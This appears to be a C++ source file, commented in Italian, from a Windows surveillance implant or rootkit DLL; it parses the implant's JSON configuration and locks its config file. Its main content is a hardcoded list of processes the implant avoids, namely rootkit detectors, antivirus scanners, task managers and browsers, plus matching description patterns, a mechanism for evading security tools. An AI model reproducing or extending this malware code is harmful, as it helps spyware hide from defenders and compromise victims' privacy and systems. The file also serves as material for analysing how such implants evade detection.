#include <windows.h>
#include <json/JSON.h>
#include "common.h"
#include "bss.h"
#include "H4-DLL.h"
#include "LOG.h"

// Usata per lockare il file di conf
HANDLE conf_file_handle = NULL;

// Passa alla callback tutti i sotto-oggetti dell'oggetto "section" nella configurazione json
typedef void (WINAPI* conf_callback_t)(JSONObject, DWORD counter);
BOOL HM_ParseConfSection(char* conf, WCHAR* section, conf_callback_t call_back)
{
	JSONValue* value;
	JSONObject root;
	DWORD counter = 0;

	value = JSON::Parse(conf);
	if (!value)
		return FALSE;
	if (value->IsObject() == false) {
		delete value;
		return FALSE;
	}
	root = value->AsObject();

	if (root.find(section) != root.end() && root[section]->IsArray()) {
		JSONArray jarray = root[section]->AsArray();
		for (unsigned int i = 0; i < jarray.size(); i++) {
			if (jarray[i]->IsObject())
				call_back(jarray[i]->AsObject(), counter++);
		}
	}
	delete value;
	return TRUE;
}

// Passa l'oggetto json delle globals
BOOL HM_ParseConfGlobals(char* conf, conf_callback_t call_back)
{
	JSONValue* value;
	JSONObject root, obj;

	value = JSON::Parse(conf);
	if (!value)
		return FALSE;
	if (value->IsObject() == false) {
		delete value;
		return FALSE;
	}
	root = value->AsObject();

	if (!root[L"globals"]->IsObject()) {
		delete value;
		return FALSE;
	}
	obj = root[L"globals"]->AsObject();
	call_back(obj, 0);

	delete value;
	return TRUE;
}

BOOL HM_CountConfSection(char* conf, WCHAR* section, DWORD* count)
{
	JSONValue* value;
	JSONObject root;

	*count = 0;
	value = JSON::Parse(conf);
	if (!value)
		return FALSE;
	if (value->IsObject() == false) {
		delete value;
		return FALSE;
	}
	root = value->AsObject();

	if (root.find(section) != root.end() && root[section]->IsArray()) {
		JSONArray jarray = root[section]->AsArray();
		*count = jarray.size();
	}
	delete value;
	if (*count != 0)
		return TRUE;
	return FALSE;
}


void WINAPI ParseBypassCallback(JSONObject conf_json, DWORD dummy)
{
	DWORD index;
	JSONArray bypass_array = conf_json[L"nohide"]->AsArray();
	shared.process_bypassed = bypass_array.size();
	if (shared.process_bypassed > MAX_DYNAMIC_BYPASS)
		shared.process_bypassed = MAX_DYNAMIC_BYPASS;
	shared.process_bypassed += EMBEDDED_BYPASS; // Inserisce i processi hardcoded

	// Legge i processi rimanenti dal file di configurazione
	for (index = 0; index < bypass_array.size(); index++)
		_snprintf_s(shared.process_bypass_list[index + EMBEDDED_BYPASS], MAX_PBYPASS_LEN, _TRUNCATE, "%S", bypass_array[index]->AsString().c_str());
}

void WINAPI ParseDriverHandling(JSONObject conf_json, DWORD dummy)
{
	shared.g_remove_driver = (BOOL)conf_json[L"remove_driver"]->AsBool();
}


// Legge le configurazioni globali
void HM_UpdateGlobalConf()
{
	HANDLE h_conf_file;
	DWORD readn;
	char conf_path[DLLNAMELEN];
	char* conf_memory;

	// Se non riesce a leggere la configurazione, inizializza comunque
	// i valori globali.
	memset(&date_delta, 0, sizeof(date_delta));
	// Lista di processi da non toccare
	shared.process_bypassed = EMBEDDED_BYPASS;
	ZeroMemory(shared.process_bypass_list, sizeof(shared.process_bypass_list));
	strcpy(shared.process_bypass_list[0], "outlook.exe");
	strcpy(shared.process_bypass_list[1], "ielowutil.exe");
	//strcpy(process_bypass_list[2],"KProcCheck.exe");
	strcpy(shared.process_bypass_list[3], "TaskMan.exe");
	strcpy(shared.process_bypass_list[4], "hackmon.exe");
	strcpy(shared.process_bypass_list[5], "hiddenfinder.exe");
	strcpy(shared.process_bypass_list[6], "Unhackme.exe");
	//strcpy(process_bypass_list[7],"blbeta.exe");
	strcpy(shared.process_bypass_list[8], "fsbl.exe");
	strcpy(shared.process_bypass_list[9], "sargui.exe");
	strcpy(shared.process_bypass_list[10], "avgarkt.exe");
	strcpy(shared.process_bypass_list[11], "avscan.exe");
	strcpy(shared.process_bypass_list[12], "RootkitRevealer.exe");
	strcpy(shared.process_bypass_list[13], "taskmgr.exe");
	strcpy(shared.process_bypass_list[14], "avgscanx.exe");
	strcpy(shared.process_bypass_list[15], "IceSword.exe");
	//strcpy(process_bypass_list[16],"svv.exe");
	strcpy(shared.process_bypass_list[17], "rku*.exe");
	strcpy(shared.process_bypass_list[18], "pavark.exe");
	strcpy(shared.process_bypass_list[19], "avp.exe");
	strcpy(shared.process_bypass_list[20], "bgscan.exe");
	strcpy(shared.process_bypass_list[21], "FlashPlayerPlugin_*.exe");
	strcpy(shared.process_bypass_list[22], "avk.exe");
	strcpy(shared.process_bypass_list[23], "k7*.exe");
	strcpy(shared.process_bypass_list[24], "rootkitbuster*.exe");
	strcpy(shared.process_bypass_list[25], "pcts*.exe");
	strcpy(shared.process_bypass_list[26], "iexplore.exe");
	strcpy(shared.process_bypass_list[27], "chrome.exe");
	strcpy(shared.process_bypass_list[28], "fsm32.exe");
	// XXX Se ne aggiungo, ricordarsi di modificare EMBEDDED_BYPASS

	// Gestisco le descrizioni per i processi per cui le ho
	ZeroMemory(shared.process_bypass_desc, sizeof(shared.process_bypass_desc));
	wcscpy(shared.process_bypass_desc[0], L"*Outlook*");
	wcscpy(shared.process_bypass_desc[3], L"Security Task Manager");
	wcscpy(shared.process_bypass_desc[4], L"Detects*rootkits*");
	wcscpy(shared.process_bypass_desc[5], L"*Hidden*Process*Finder*");
	wcscpy(shared.process_bypass_desc[6], L"Detects*rootkits*");
	wcscpy(shared.process_bypass_desc[8], L"*Secure*BlackLight*");
	wcscpy(shared.process_bypass_desc[9], L"Sophos Anti*Rootkit*");
	wcscpy(shared.process_bypass_desc[10], L"AVG Anti*Rootkit*");
	wcscpy(shared.process_bypass_desc[12], L"Rootkit detection utility*");
	wcscpy(shared.process_bypass_desc[18], L"*pavark*");
	wcscpy(shared.process_bypass_desc[24], L"Trend Micro RootkitBuster*");
	wcscpy(shared.process_bypass_desc[26], L"*Internet Explorer*");
	wcscpy(shared.process_bypass_desc[27], L"*Google*Chrome*");
	wcscpy(shared.process_bypass_desc[28], L"*F-Secure Settings*");

	// Legge il delta date dal file di stato...
	Log_RestoreAgentState(PM_CORE, (BYTE*)&date_delta, sizeof(date_delta));

	// Legge la lista dei processi da bypassare e la gestione del driver
	conf_memory = HM_ReadClearConf(shared.H4_CONF_FILE);
	if (conf_memory) {
		HM_ParseConfGlobals(conf_memory, &ParseBypassCallback);
		HM_ParseConfGlobals(conf_memory, &ParseDriverHandling);
	}
	SAFE_FREE(conf_memory);
}

void LockConfFile()
{
	char conf_path[DLLNAMELEN];
	HM_CompletePath(shared.H4_CONF_FILE, conf_path);
	FNC(SetFileAttributesA)(conf_path, FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_ARCHIVE);
	conf_file_handle = FNC(CreateFileA)(conf_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
}

void UnlockConfFile()
{
	DWORD i;
	char conf_path[DLLNAMELEN];

	HM_CompletePath(shared.H4_CONF_FILE, conf_path);

	if (conf_file_handle)
		CloseHandle(conf_file_handle);
	conf_file_handle = NULL;

	for (i = 0; i < MAX_DELETE_TRY; i++) {
		if (FNC(SetFileAttributesA)(conf_path, FILE_ATTRIBUTE_NORMAL))
			break;
		Sleep(DELETE_SLEEP_TIME);
	}
}